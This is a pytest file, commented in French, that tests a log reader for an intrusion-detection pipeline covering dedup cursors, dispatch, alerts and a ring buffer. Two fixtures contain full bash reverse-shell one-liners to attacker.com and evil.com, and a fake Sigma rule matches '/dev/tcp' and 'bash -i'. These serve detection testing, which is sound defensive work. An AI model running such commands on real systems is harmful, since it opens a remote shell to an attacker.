"""
test_log_reader.py
==================
Approche finale : on ne teste pas _dispatch_worker via asyncio.
On teste directement la logique de chaque étape de façon synchrone.

Pourquoi : _dispatch_worker utilise loop.run_in_executor qui délègue
sigma/ae à des threads OS. asyncio.Event.set() depuis un thread ne
réveille pas fiablement l'Event dans la boucle principale en test.

Solution : extraire la logique de traitement d'un log dans une méthode
_process_one() testable de façon synchrone avec asyncio.run().

Lance avec : pytest core/test_log_reader.py -v
"""

import asyncio
import json
import os
from unittest.mock import patch

import pytest


# =============================================================================
# HELPERS
# =============================================================================

def jlog(ts: int, msg: str = "test", ident: str = "sshd") -> str:
    return json.dumps({
        "__REALTIME_TIMESTAMP": str(ts),
        "SYSLOG_IDENTIFIER":   ident,
        "MESSAGE":             msg,
        "_PID":                "999",
        "PRIORITY":            "6",
    })


class FakeSigma:
    def match(self, log_entry: dict) -> list:
        msg = log_entry.get("MESSAGE", "")
        if "Failed password" in msg:
            return ["SSH_BruteForce"]
        if "/dev/tcp" in msg or "bash -i" in msg:
            return ["ReverseShell"]
        return []


class FakeAE:
    def reconstruction_error(self, log_entry: dict) -> float:
        msg = log_entry.get("MESSAGE", "")
        if "Failed password" in msg or "/dev/tcp" in msg:
            return 0.9
        return 0.05


class FakeRouter:
    def route(self, log_entry, sigma_matches, ae_score):
        from types import SimpleNamespace
        r = SimpleNamespace()
        r.log_entry     = log_entry
        r.sigma_matches = sigma_matches
        if sigma_matches and ae_score > 0.5:
            r.source   = SimpleNamespace(value="both")
            r.severity = "critical"
        elif sigma_matches:
            r.source   = SimpleNamespace(value="sigma_only")
            r.severity = "high"
        elif ae_score > 0.5:
            r.source   = SimpleNamespace(value="ae_only")
            r.severity = "high"
        else:
            r.source   = SimpleNamespace(value="none")
            r.severity = "none"
        return r


# =============================================================================
# FIXTURE
# =============================================================================

@pytest.fixture
def tmp_cursor(tmp_path):
    return str(tmp_path / "cursor.txt")


@pytest.fixture
def make_reader(tmp_cursor):
    def _build(sigma=None, ae=None, router=None):
        sigma  = sigma  or FakeSigma()
        ae     = ae     or FakeAE()
        router = router or FakeRouter()

        with patch("log_reader.make_grok_client", side_effect=ValueError("no key")), \
             patch("log_reader.CURSOR_FILE", tmp_cursor):
            from log_reader import LogReader
            lr = LogReader(sigma, ae, router)
        return lr

    return _build


# =============================================================================
# HELPER : traite UN log directement (sans executor, sans thread)
# =============================================================================

def process_one(lr, raw: str, cursor_file: str) -> dict | None:
    """
    Reproduit la logique de _dispatch_worker pour un seul log,
    de façon entièrement synchrone.
    Retourne l'alert_record si une alerte est créée, None sinon.
    """
    from log_reader import _load_cursor, _save_cursor

    # Parse
    try:
        log_entry = json.loads(raw)
    except json.JSONDecodeError:
        return None

    # Dedup
    try:
        ts = int(log_entry.get("__REALTIME_TIMESTAMP", "0"))
    except (ValueError, TypeError):
        ts = 0

    with patch("log_reader.CURSOR_FILE", cursor_file):
        if ts and ts <= _load_cursor():
            return None

    # Sigma + AE (synchrones)
    try:
        sigma_matches = lr.sigma.match(log_entry)
    except Exception as e:
        print(f"sigma error: {e}")
        sigma_matches = []

    try:
        ae_score = float(lr.ae.reconstruction_error(log_entry))
    except Exception as e:
        print(f"ae error: {e}")
        ae_score = 0.0

    sigma_matches = sigma_matches or []

    # Routing
    result = lr.router.route(log_entry, sigma_matches, ae_score)

    # Sauvegarde cursor
    with patch("log_reader.CURSOR_FILE", cursor_file):
        if ts:
            _save_cursor(ts)

    if result.source.value == "none":
        return None

    # Mise à jour stats
    lr.stats["alerts_total"] += 1
    src = result.source.value
    if src == "ae_only":      lr.stats["alerts_ae"]    += 1
    elif src == "sigma_only": lr.stats["alerts_sigma"] += 1
    elif src == "both":       lr.stats["alerts_both"]  += 1

    alert_record = {
        "timestamp":       ts,
        "source":          src,
        "severity":        result.severity,
        "log_source":      log_entry.get("SYSLOG_IDENTIFIER", "?"),
        "message":         log_entry.get("MESSAGE", ""),
        "ae_score":        round(ae_score, 4),
        "sigma_matches":   sigma_matches,
        "llm_explanation": None,
        "kb_severity":     "UNKNOWN",
    }
    lr._push_alert(alert_record)
    return alert_record


# =============================================================================
# 1. DEDUP
# =============================================================================

class TestDedup:

    def test_log_normal_traite(self, make_reader, tmp_cursor):
        """Un log avec ts > cursor est traité."""
        lr = make_reader()
        result = process_one(lr, jlog(ts=1000), tmp_cursor)
        # log normal → pas d'alerte mais sigma a été appelé
        # On vérifie que la fonction ne retourne pas None à cause du dedup
        # (elle retourne None si pas d'alerte, mais le cursor est quand même mis à jour)
        with patch("log_reader.CURSOR_FILE", tmp_cursor):
            from log_reader import _load_cursor
            assert _load_cursor() == 1000

    def test_log_deja_vu_ignore(self, make_reader, tmp_cursor):
        """Un log avec ts <= cursor est ignoré."""
        with patch("log_reader.CURSOR_FILE", tmp_cursor):
            from log_reader import _save_cursor
            _save_cursor(5000)

        appele = False

        class SpySigma:
            def match(self, entry):
                nonlocal appele
                appele = True
                return []

        lr = make_reader(sigma=SpySigma())
        process_one(lr, jlog(ts=5000), tmp_cursor)

        assert not appele, "sigma appelé sur un log déjà traité"

    def test_cursor_mis_a_jour(self, make_reader, tmp_cursor):
        """Après traitement d'un log ts=9999, le cursor vaut 9999."""
        lr = make_reader()
        process_one(lr, jlog(ts=9999), tmp_cursor)

        with patch("log_reader.CURSOR_FILE", tmp_cursor):
            from log_reader import _load_cursor
            assert _load_cursor() == 9999

    def test_cursor_zero_au_premier_demarrage(self, tmp_path):
        """Sans fichier cursor, _load_cursor retourne 0."""
        with patch("log_reader.CURSOR_FILE", str(tmp_path / "inexistant.txt")):
            from log_reader import _load_cursor
            assert _load_cursor() == 0

    def test_deux_logs_distincts_deux_traitements(self, make_reader, tmp_cursor):
        """Deux logs avec des ts différents sont tous les deux traités."""
        count = [0]

        class CountSigma:
            def match(self, entry):
                count[0] += 1
                return []

        lr = make_reader(sigma=CountSigma())
        process_one(lr, jlog(ts=1000), tmp_cursor)
        process_one(lr, jlog(ts=2000), tmp_cursor)

        assert count[0] == 2


# =============================================================================
# 2. DISPATCH
# =============================================================================

class TestDispatch:

    def test_sigma_et_ae_appeles(self, make_reader, tmp_cursor):
        """sigma.match ET ae.reconstruction_error sont appelés."""
        sigma_appele = [False]
        ae_appele    = [False]

        class WatchSigma:
            def match(self, entry):
                sigma_appele[0] = True
                return []

        class WatchAE:
            def reconstruction_error(self, entry):
                ae_appele[0] = True
                return 0.1

        lr = make_reader(sigma=WatchSigma(), ae=WatchAE())
        process_one(lr, jlog(ts=1), tmp_cursor)

        assert sigma_appele[0], "sigma.match non appelé"
        assert ae_appele[0],    "ae.reconstruction_error non appelé"

    def test_sigma_crash_ae_continue(self, make_reader, tmp_cursor):
        """Si sigma crash, l'AE est quand même appelé."""
        ae_appele = [False]

        class CrashSigma:
            def match(self, entry):
                raise RuntimeError("sigma crash")

        class WatchAE:
            def reconstruction_error(self, entry):
                ae_appele[0] = True
                return 0.1

        lr = make_reader(sigma=CrashSigma(), ae=WatchAE())
        process_one(lr, jlog(ts=1), tmp_cursor)

        assert ae_appele[0], "ae non appelé après crash sigma"

    def test_ae_crash_sigma_continue(self, make_reader, tmp_cursor):
        """Si l'AE crash, sigma est quand même appelé."""
        sigma_appele = [False]

        class WatchSigma:
            def match(self, entry):
                sigma_appele[0] = True
                return []

        class CrashAE:
            def reconstruction_error(self, entry):
                raise RuntimeError("AE crash")

        lr = make_reader(sigma=WatchSigma(), ae=CrashAE())
        process_one(lr, jlog(ts=1), tmp_cursor)

        assert sigma_appele[0], "sigma non appelé après crash AE"

    def test_json_invalide_ignore(self, make_reader, tmp_cursor):
        """Une ligne non-JSON retourne None sans crash."""
        lr = make_reader()
        result = process_one(lr, "ceci n'est pas du JSON !!!", tmp_cursor)
        assert result is None

    def test_log_valide_apres_json_invalide(self, make_reader, tmp_cursor):
        """Après un JSON invalide, un log valide est bien traité."""
        count = [0]

        class CountSigma:
            def match(self, entry):
                count[0] += 1
                return []

        lr = make_reader(sigma=CountSigma())
        process_one(lr, "pas du json", tmp_cursor)
        process_one(lr, jlog(ts=1, msg="log valide"), tmp_cursor)

        assert count[0] == 1


# =============================================================================
# 3. ALERTES
# =============================================================================

class TestAlertes:

    def test_log_attaque_cree_alerte(self, make_reader, tmp_cursor):
        """Un log SSH brute force crée une alerte."""
        lr = make_reader()
        alert = process_one(lr, jlog(ts=1, msg="Failed password for root from 1.2.3.4"), tmp_cursor)

        assert alert is not None
        assert lr.stats["alerts_total"] == 1
        assert len(lr._alert_ring) == 1
        assert alert["source"] == "both"
        assert alert["sigma_matches"] == ["SSH_BruteForce"]
        assert alert["ae_score"] == 0.9

    def test_log_normal_pas_alerte(self, make_reader, tmp_cursor):
        """Un log normal ne crée pas d'alerte."""
        lr = make_reader()
        alert = process_one(lr, jlog(ts=1, msg="session opened for user ubuntu"), tmp_cursor)

        assert alert is None
        assert lr.stats["alerts_total"] == 0

    def test_compteurs_both(self, make_reader, tmp_cursor):
        """2 logs d'attaque → alerts_both == 2, alerts_total == 2."""
        lr = make_reader()
        process_one(lr, jlog(ts=1, msg="Failed password for root from 1.2.3.4"), tmp_cursor)
        process_one(lr, jlog(ts=2, msg="session opened for user ubuntu"), tmp_cursor)
        process_one(lr, jlog(ts=3, msg="bash -i >& /dev/tcp/attacker.com/4444 0>&1"), tmp_cursor)

        assert lr.stats["alerts_total"] == 2
        assert lr.stats["alerts_both"]  == 2

    def test_alerte_contient_bon_message(self, make_reader, tmp_cursor):
        """L'alerte conserve le message original du log."""
        lr = make_reader()
        msg = "Failed password for root from 192.168.1.1"
        alert = process_one(lr, jlog(ts=1, msg=msg), tmp_cursor)

        assert alert["message"] == msg
        assert alert["log_source"] == "sshd"

    def test_reverse_shell_detecte(self, make_reader, tmp_cursor):
        """Un reverse shell est détecté par sigma et l'AE."""
        lr = make_reader()
        alert = process_one(lr, jlog(ts=1, msg="bash -i >& /dev/tcp/evil.com/4444 0>&1"), tmp_cursor)

        assert alert is not None
        assert "ReverseShell" in alert["sigma_matches"]


# =============================================================================
# 4. RING BUFFER
# =============================================================================

class TestRingBuffer:

    def test_taille_max_respectee(self, make_reader):
        lr = make_reader()
        for i in range(lr._alert_ring_max + 50):
            lr._push_alert({"ts": i})
        assert len(lr._alert_ring) == lr._alert_ring_max

    def test_plus_recent_en_premier(self, make_reader):
        lr = make_reader()
        for i in range(5):
            lr._push_alert({"ts": i})
        assert lr.get_recent_alerts(5)[0]["ts"] == 4

    def test_limit_respectee(self, make_reader):
        lr = make_reader()
        for i in range(100):
            lr._push_alert({"ts": i})
        assert len(lr.get_recent_alerts(10)) == 10


# =============================================================================
# 5. CURSOR (fonctions standalone)
# =============================================================================

class TestCursor:

    def test_save_et_load(self, tmp_path):
        path = str(tmp_path / "cursor.txt")
        with patch("log_reader.CURSOR_FILE", path):
            from log_reader import _save_cursor, _load_cursor
            _save_cursor(12345)
            assert _load_cursor() == 12345

    def test_load_fichier_inexistant(self, tmp_path):
        path = str(tmp_path / "nope.txt")
        with patch("log_reader.CURSOR_FILE", path):
            from log_reader import _load_cursor
            assert _load_cursor() == 0

    def test_load_fichier_corrompu(self, tmp_path):
        path = str(tmp_path / "bad.txt")
        open(path, "w").write("pas_un_nombre")
        with patch("log_reader.CURSOR_FILE", path):
            from log_reader import _load_cursor
            assert _load_cursor() == 0